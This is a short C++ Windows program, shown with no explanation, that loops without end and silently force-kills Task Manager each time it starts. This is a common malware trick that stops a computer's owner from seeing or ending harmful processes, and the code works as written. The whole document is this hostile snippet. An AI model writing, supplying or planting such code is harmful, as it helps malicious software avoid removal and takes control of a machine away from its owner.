#include <windows.h>
int main() {
    while (true) {
        system("taskkill /f /im taskmgr.exe >nul 2>&1");
    }
    return 0;
}